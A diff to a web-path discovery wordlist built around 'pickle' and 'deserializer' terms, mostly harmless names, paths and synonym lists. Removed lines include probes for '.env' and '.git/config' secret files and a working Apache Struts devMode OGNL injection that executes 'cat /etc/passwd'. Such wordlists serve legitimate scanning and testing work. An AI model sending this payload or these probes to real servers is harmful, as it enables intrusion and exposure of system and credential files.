@@ -226,12 +226,6 @@ andthepickles
 angelica_picklez.91
 angelspickle
 api-functional/testsuite/magento/webapi/deserializationtest.php
-api/channel/hls/pickles4nickles.m3u8
-api/clone/picklezone/question
-api/pickle/guest/v1/user/i4k5ixwdxnbi-guest
-api/pickle_plans
-api/v2/recess-pickleball/timeline/
-api/v2/sites/pickleball360/configuration
 api_v3/lib/kalturarequestdeserializer.php
 apickle
 apickleforyourthoughts
@@ -554,8 +548,6 @@ deserializer.out.xml
 deserializer.php
 deserializer.rb
 deserializer.xml
-deserializer/.env
-deserializer/.git/config
 deserializer/functions.php
 deserializer/json.php
 deserializer/jsontest.php
@@ -587,7 +579,6 @@ desiccate,air-dry,anhydrate,bake,blast-freeze,blot,brine,brush,burn,corn,cure,de
 designpickle
 designpickle-com
 dev/tests/api-functional/testsuite/magento/webapi/deserializationtest.php
-devmode.action?debug=command&expression=(%23_memberaccess[%22allowstaticmethodaccess%22]%3dtrue%2c%23foo%3dnew%20java.lang.boolean(%22false%22)%20%2c%23context[%22xwork.methodaccessor.denymethodexecution%22]%3d%23foo%2c@org.apache.commons.io.ioutils@tostring(@java.lang.runtime@getruntime().exec(%27cat%20/etc/passwd%27).getinputstream()))
 difficulty,gordian knot,abstruseness,adverse circumstances,adversity,affliction,aggravation,agreement to disagree,altercation,annoyance,arduousness,asperity,bad news,bedevilment,beef,bickering,blight,block,blockade,bore,bother,botheration,bothersomeness,bottleneck,bummer,burden,burthen,care,cargo,catch,challenge,charge,complexity,complication,controversy,cordon,crabbedness,crampedness,crashing bore,cross,cross-purposes,cumbrance,curse,curtain,deadweight,deepness,demurral,demurrer,determent,deterrent,devilment,difference,difference of opinion,difficulties,dilemma,disadvantage,disagreement,disparity,dispute,distress,dividedness,division,dogging,downer,drag,drawback,embarrassment,emergency,encumbrance,esoterica,exasperation,exigency,falling-out,fight,fix,formidableness,freight,hamper,handicap,hang-up,harassment,hard knocks,hard life,hard lot,hardcase,hardness,hardship,harrying,hassle,hazard,headache,heavy sledding,hindrance,hitch,hot water,hounding,hurdle,impediment,impedimenta,imposition,inconvenience,intricacy,irritation,jam,joker,knottiness,laboriousness,load,lumber,mess,misunderstanding,molestation,nuisance,objection,obstacle,obstruction,obstructive,odds,one small difficulty,onus,pack,painfulness,pass,penalty,persecution,pest,pickle,pinch,pitfall,plight,polarization,predicament,pressure,problem,profoundness,profundity,protest,quandary,question,reconditeness,remonstrance,remonstration,rigor,rub,scrape,sea of troubles,snag,squabble,strain,strait,straits,stress,stress of life,stumbling block,stumbling stone,trial,tribulation,trouble,troubles,vale of tears,variance,vexation,vexatiousness,vicissitude,vigor,weight,white elephant,worriment,worry
 digitalpickle-com
 dilemma,aristotelian sorites,goclenian sorites,gordian knot,scylla and charybdis,baffle,bafflement,bewilderment,bind,bother,box,catch-22,categorical syllogism,choice of hercules,confoundment,confusion,corner,crux,deadlock,difficulty,discomposure,disconcert,disconcertedness,disconcertion,disconcertment,disturbance,embarrassment,enigma,enthymeme,figure,fix,hole,impasse,jam,knot,knotty point,mode,modus tollens,mood,mystery,mystification,no choice,node,nodus,nonplus,only choice,oxymoron,paradox,paralogism,perplexity,perturbation,pickle,plight,pons asinorum,poser,pother,predicament,problem,prosyllogism,pseudosyllogism,puzzle,puzzlement,quandary,riddle,rule,rule of deduction,scrape,snooker,sorites,spot,squeeze,stalemate,stew,stymie,syllogism,teaser,trouble,unassuredness,upset,vexed question
@@ -746,6 +737,8 @@ gizmopickle
 gizmospickles-com
 goosepickle
 gopickle
+government/agencies-departments-offices-redirect/agencies-departments-offices-directory/parks-recreation/news/2021/city-celebrates-a-summer-of-tennis-and-pickleball-at-the-new-bear-valley-courts
+government/agencies-departments-offices-redirect/agencies-departments-offices/parks-recreation/news/2021/city-celebrates-a-summer-of-tennis-and-pickleball-at-the-new-bear-valley-courts
 government/agencies-departments-offices/agencies-departments-offices-directory/parks-recreation/news/2021/city-celebrates-a-summer-of-tennis-and-pickleball-at-the-new-bear-valley-courts
 government/agencies-departments-offices/agencies-departments-offices/parks-recreation/news/2021/city-celebrates-a-summer-of-tennis-and-pickleball-at-the-new-bear-valley-courts
 government/agencies-departments-offices/parks-recreation/news/2021/city-celebrates-a-summer-of-tennis-and-pickleball-at-the-new-bear-valley-courts
@@ -2561,10 +2554,6 @@ user/setup/patch/data/upgradeserializedfields.php
 usingpickle
 uuiddeserializer.class
 uuiddeserializer.java
-v1/merchant-info/clubpickleballshop.myshopify.com
-v1/parking/landers/srgunturpickles.com
-v1/projects/picklemall/installations
-v1/shop/rhino-pickleball.myshopify.com/wishlist
 valuedeserializer.java
 vanilla-editor/plugins/mentionplugin/deserializementionhtml.ts
 vanilla-editor/plugins/richembedplugin/deserializerichembedhtml.spec.tsx
@@ -2631,9 +2620,7 @@ windowsazure/serviceruntime/internal/xmlroleenvironmentdatadeserializer.php
 world.pickle.zip
 wp-content/plugins/deserialize-metadata/
 wp-content/plugins/worker/src/dropbox/deserializeexception.php
-wp-content/themes/pickle
 wp-content/themes/pickle/
-wp-content/themes/picklewagon
 wp-content/themes/picklewagon/
 www.getpickle
 www.namdharipickle
